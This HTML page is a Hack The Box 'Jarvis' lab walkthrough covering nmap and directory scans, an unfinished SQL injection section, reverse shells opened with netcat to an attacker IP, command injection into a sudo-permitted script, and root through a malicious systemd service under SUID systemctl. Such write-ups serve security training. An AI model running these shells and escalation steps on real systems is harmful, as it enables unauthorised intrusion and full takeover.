

<!DOCTYPE html>
<html class="writer-html5" lang="en" data-content_root="../../../">
<head>
  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Jarvis HTB walkthrough &mdash; docs 0.1 documentation</title>
      <link rel="stylesheet" type="text/css" href="../../../_static/pygments.css?v=b86133f3" />
      <link rel="stylesheet" type="text/css" href="../../../_static/css/theme.css?v=9edc463e" />

  
      <script src="../../../_static/jquery.js?v=5d32c60e"></script>
      <script src="../../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
      <script src="../../../_static/documentation_options.js?v=2709fde1"></script>
      <script src="../../../_static/doctools.js?v=fd6eb6e6"></script>
      <script src="../../../_static/sphinx_highlight.js?v=6ffebe34"></script>
    <script src="../../../_static/js/theme.js"></script>
    <link rel="index" title="Index" href="../../../genindex.html" />
    <link rel="search" title="Search" href="../../../search.html" />
    <link rel="next" title="Information Disclosure home Page" href="../info_disclosure/index.html" />
    <link rel="prev" title="SUID home Page" href="index.html" /> 
</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >

          
          
          <a href="../../../index.html" class="icon icon-home">
            docs
          </a>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../../../coding/index.html">Coding Homepage</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../../hacking/index.html">Hacking Home Page</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../../defense/index.html">Cyber Defense Home Page</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../../IT/index.html">IT Homepage</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../../interview_questions/index.html">interview questions</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../../index.html">Walkthroughs Page</a><ul class="current">
<li class="toctree-l2 current"><a class="reference internal" href="../index.html">Hack The Box Page</a><ul class="current">
<li class="toctree-l3 current"><a class="reference internal" href="index.html">SUID home Page</a><ul class="current">
<li class="toctree-l4 current"><a class="current reference internal" href="#">Jarvis HTB walkthrough</a></li>
<li class="toctree-l4"><a class="reference internal" href="index.html#indices-and-tables">Indices and tables</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../info_disclosure/index.html">Information Disclosure home Page</a></li>
<li class="toctree-l3"><a class="reference internal" href="../pivot/index.html">Pivot Page</a></li>
<li class="toctree-l3"><a class="reference internal" href="../index.html#indices-and-tables">Indices and tables</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../index.html#indices-and-tables">Indices and tables</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../../../photoshop/index.html">Photoshop home Page</a></li>
</ul>

        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../../../index.html">docs</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="Page navigation">
  <ul class="wy-breadcrumbs">
      <li><a href="../../../index.html" class="icon icon-home" aria-label="Home"></a></li>
          <li class="breadcrumb-item"><a href="../../index.html">Walkthroughs Page</a></li>
          <li class="breadcrumb-item"><a href="../index.html">Hack The Box Page</a></li>
          <li class="breadcrumb-item"><a href="index.html">SUID home Page</a></li>
      <li class="breadcrumb-item active">Jarvis HTB walkthrough</li>
      <li class="wy-breadcrumbs-aside">
            <a href="../../../_sources/walkthroughs/HTB/SUID_exploit/jarvis.rst.txt" rel="nofollow"> View page source</a>
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section id="jarvis-htb-walkthrough">
<h1>Jarvis HTB walkthrough<a class="headerlink" href="#jarvis-htb-walkthrough" title="Link to this heading"></a></h1>
<section id="nmap">
<h2>Nmap<a class="headerlink" href="#nmap" title="Link to this heading"></a></h2>
<p>To start off we run a nmap scan</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PORT      STATE SERVICE VERSION</span>

<span class="go">22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span>

<span class="go">| ssh-hostkey:</span>

<span class="go">|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)</span>

<span class="go">|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)</span>

<span class="go">|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)</span>

<span class="go">80/tcp    open  http    Apache httpd 2.4.25 ((Debian))</span>

<span class="go">|_http-server-header: Apache/2.4.25 (Debian)</span>

<span class="go">| http-cookie-flags:</span>

<span class="go">|   /:</span>

<span class="go">|     PHPSESSID:</span>

<span class="go">|_      httponly flag not set</span>

<span class="go">|_http-title: Stark Hotel</span>

<span class="go">64999/tcp open  http    Apache httpd 2.4.25 ((Debian))</span>

<span class="go">|_http-server-header: Apache/2.4.25 (Debian)</span>

<span class="go">|_http-title: Site doesn&#39;t have a title (text/html).</span>

<span class="go">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
</pre></div>
</div>
<p>We discover ports <cite>80</cite> and <cite>64999</cite> are open.</p>
</section>
<section id="enumerating-port-80">
<h2>Enumerating port 80<a class="headerlink" href="#enumerating-port-80" title="Link to this heading"></a></h2>
<p>We then enumerate port 80 by running dirbuster. This can also be done with gobuster.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">dirb http://jarvis -w /usr/share/wordlists/dirb/common.txt</span>
<span class="go">+ http://jarvis/index.php (CODE:200|SIZE:23628)</span>
<span class="go"> ==&gt; DIRECTORY: http://jarvis/phpmyadmin/</span>
<span class="go">http://jarvis/room.php</span>
</pre></div>
</div>
</section>
<section id="enumerating-port-64999">
<h2>Enumerating port 64999<a class="headerlink" href="#enumerating-port-64999" title="Link to this heading"></a></h2>
<p>When you go to <cite>http://jarvis:64999/</cite> it just gives you the text</p>
<blockquote>
<div><p>Hey you have been banned for 90 seconds, don’t be bad</p>
</div></blockquote>
</section>
<section id="sql-injection">
<h2>SQL Injection<a class="headerlink" href="#sql-injection" title="Link to this heading"></a></h2>
<p>When we go to room.php we can see that it specifies a number: <em>http://jarvis/room.php?cod=1</em> . When we run <em>http://jarvis/room.php?cod=’</em> it does not display any hotel information.</p>
<p><em>ADD MORE STUFF</em></p>
</section>
<section id="inital-shell">
<h2>Inital Shell<a class="headerlink" href="#inital-shell" title="Link to this heading"></a></h2>
<p>Go to this website to create the shell</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">http://supersecurehotel.htb/shell.php?cmd=nc -e /bin/bash 10.10.14.20 4444</span>
</pre></div>
</div>
<p>We then run this command to see what commands we can execute as sudo</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">sudo –l</span>
<span class="gp gp-VirtualEnv">(pepper : ALL)</span> <span class="go">NOPASSWD: /var/www/Admin-Utilities/simpler.py</span>
</pre></div>
</div>
<p>We can see that as pepper, we can execute simpler.py as root.</p>
<p>To make are shell prettier we execute this command</p>
<p>..code-block:: console</p>
<blockquote>
<div><p>python -c ‘import pty; pty.spawn(“/bin/bash”)’</p>
</div></blockquote>
<section id="more-shell-access">
<h3>More Shell Access<a class="headerlink" href="#more-shell-access" title="Link to this heading"></a></h3>
<p>We then run the following command to get more access within the shell</p>
<p>..code-block:: console</p>
<blockquote>
<div><p>sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
Enter an IP: $(bash)
<a class="reference external" href="mailto:pepper&#37;&#52;&#48;jarvis">pepper<span>&#64;</span>jarvis</a>:~$ nc -e /bin/bash 10.10.14.20 4443</p>
</div></blockquote>
<p>We then listen to the port with netcat and we should have more commands we can execute</p>
<p>..code-block:: console</p>
<blockquote>
<div><p>Nc –lvnp 4443</p>
</div></blockquote>
</section>
</section>
<section id="pe">
<h2>PE<a class="headerlink" href="#pe" title="Link to this heading"></a></h2>
<p>We then moved Linenum.sh onto machine and found the SSUID</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">./LinEnum.sh -t</span>
<span class="go">/bin/fusermount</span>
<span class="go">/bin/mount</span>
<span class="go">/bin/ping</span>
<span class="go">/bin/systemctl</span>
<span class="go">/bin/umount</span>
<span class="go">/bin/su</span>
<span class="go">/usr/bin/newgrp</span>
<span class="go">/usr/bin/passwd</span>
<span class="go">/usr/bin/gpasswd</span>
<span class="go">/usr/bin/chsh</span>
<span class="go">/usr/bin/sudo</span>
<span class="go">/usr/bin/chfn</span>
<span class="go">/usr/lib/eject/dmcrypt-get-device</span>
<span class="go">/usr/lib/openssh/ssh-keysign</span>
<span class="go">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
</pre></div>
</div>
<section id="exploit-suid">
<h3>Exploit SUID<a class="headerlink" href="#exploit-suid" title="Link to this heading"></a></h3>
<p>We see that systemctl is SUID exploitable. So we then go to <cite>/tmp</cite> and create the exploit.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">cd /tmp</span>
<span class="go">cp mynameis.service /home/pepper</span>
<span class="go">vi mynameis.service</span>
<span class="go">[Service] Type=notify ExecStart=/bin/bash -c &#39;nc -e /bin/bash 10.10.14.20 4441&#39; KillMode=process Restart=on-failure RestartSec=42s [Install] WantedBy=multi-user.target</span>
</pre></div>
</div>
<p>We  transffered it to jarvis and get root</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">/bin/systemctl link /home/pepper/mynameis.service</span>
<span class="go">/bin/systemctl enable –now mynameis.service; /bin/systemctl start mynameis.service</span>
<span class="go">Nc –lvnp 4441 # attacker machine</span>
</pre></div>
</div>
<p>There we can see root.txt which is <em>d41d8cd98f00b204e9800998ecf84271</em></p>
</section>
</section>
</section>


           </div>
          </div>
          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
        <a href="index.html" class="btn btn-neutral float-left" title="SUID home Page" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
        <a href="../info_disclosure/index.html" class="btn btn-neutral float-right" title="Information Disclosure home Page" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
    </div>

  <hr/>

  <div role="contentinfo">
    <p>&#169; Copyright 2025, mynameisORIG.</p>
  </div>

  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
    provided by <a href="https://readthedocs.org">Read the Docs</a>.
   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>